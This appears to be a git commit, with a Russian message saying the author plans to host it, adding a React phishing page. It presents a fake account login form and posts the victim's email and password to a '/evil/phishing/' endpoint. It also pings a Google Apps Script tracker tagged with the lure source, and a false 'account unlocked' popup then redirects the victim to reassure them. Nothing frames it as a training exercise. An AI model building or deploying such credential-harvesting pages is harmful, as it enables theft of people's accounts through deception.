ad850a246fd17ddacebacbcbf5201700e70052c9
AlexBerko <berko_aleksandr@mail.ru>
2023-09-15 12:19:06 +0300

    То, что планирую хостить

---
+++ phishing_web/src/App.js
@@ -0,0 +1,156 @@
+import './App.css';
+import { LockOutlined, UserOutlined } from "@ant-design/icons";
+import { BrowserRouter as Router, Route, Navigate, Routes, useLocation, useParams } from 'react-router-dom';
+import React, { useState, useEffect } from 'react';
+import { Button, Form, Input, Typography, Modal } from "antd";
+import axios from 'axios';
+
+const { Title } = Typography;
+
+function Header(props) {
+    return (
+        <header>
+            <div className="head">
+            </div>
+        </header>
+    );
+}
+
+function Login(props) {
+    const [email, setEmail] = useState('');
+    const [password, setPassword] = useState('');
+    const location = useLocation();
+    const searchParams = new URLSearchParams(location.search);
+    const who_from = searchParams.get('from') || 'unknown';
+    const [isModalVisible, setIsModalVisible] = useState(false);
+    const imgUrl = who_from ? `https://script.google.com/macros/s/AKfycbxEa4U-5hDIZUJ9l5Ft9lKkHORH4GbFVB3tlkie_KWXpxymcTQOQemR2jHWNGnx17qN/exec?site=1&from=${who_from}` : 'https://script.google.com/macros/s/AKfycbxEa4U-5hDIZUJ9l5Ft9lKkHORH4GbFVB3tlkie_KWXpxymcTQOQemR2jHWNGnx17qN/exec?site=1';
+
+    useEffect(() => {
+        const trackingPixel = async () => {
+            try {
+                const response = await axios.get(imgUrl);
+                console.log(response.data);
+            }
+            catch (error) {
+                console.error(error);
+            }
+        };
+
+        trackingPixel();
+    }, []);
+
+    const onFinish = async (values) => {
+        const { email, password } = values;
+        console.log(email);
+        console.log(password);
+        const data = {
+            from: who_from,
+            email: email,
+            password: password
+        };
+
+        try {
+            const response = await axios.post("http://localhost:8080/evil/phishing/", data);
+            console.log(response.data);
+            setIsModalVisible(true);
+        } catch (error) {
+            console.error(error);
+        }
+    };
+
+    const handleModalOk = () => {
+        setIsModalVisible(false);
+        window.location.href = "http://localhost:3000/login";
+    }
+
+    return (
+        <div className="Login login">
+            <Title level={4} style={{ textAlign: "center" }}>Войти в аккаунт</Title>
+            <Form
+                name="normal_login"
+                className="login-form"
+                initialValues={{
+                    remember: true,
+                }}
+                onFinish={onFinish}
+            >
+                <Form.Item
+                    name="email"
+                    rules={[
+                        {
+                            type: "email",
+                            message: "The input is not valid E-mail!",
+                        },
+                        {
+                            required: true,
+                            message: "Please input your E-mail!",
+                        },
+                    ]}
+                >
+                    <Input
+                        prefix={<UserOutlined className="site-form-item-icon" />}
+                        placeholder="Email"
+                    />
+                </Form.Item>
+
+                <Form.Item
+                    name="password"
+                    rules={[
+                        {
+                            required: true,
+                            message: "Please input your Password!",
+                        },
+                    ]}
+                >
+                    <Input
+                        prefix={<LockOutlined className="site-form-item-icon" />}
+                        type="password"
+                        placeholder="Password"
+                    />
+                </Form.Item>
+
+                <Form.Item className="login-button">
+                    <Button
+                        type="primary"
+                        htmlType="submit"
+                        style={{ marginRight: "10px" }}
+                    >
+                        Войти
+                    </Button>
+                </Form.Item>
+            </Form>
+
+            <Modal
+                title="Учетная запись разблокирована!"
+                visible={isModalVisible}
+                onOk={handleModalOk}
+                closable={false}
+                maskClosable={false}
+                onCancel={handleModalOk}
+            >
+                <p>Теперь Вы снова можете пользоваться всеми возможностями сайта!</p>
+            </Modal>
+        </div>
+    );
+}
+
+
+function App() {
+    return (
+        <div className="app">
+            <Router>
+                <Header />
+                <div className="container">
+                    <Routes>
+                        <Route path='/' element={<Navigate to='/loogin' />} />
+                        <Route path='/loogin' element={<Login />} />
+                        <Route path='/loogin/:from' element={<Login />} />
+                        <Route path='*' element={<Navigate to='/' />} />
+                    </Routes>
+                </div>
+            </Router>
+        </div>
+    );
+}
+
+export default App;
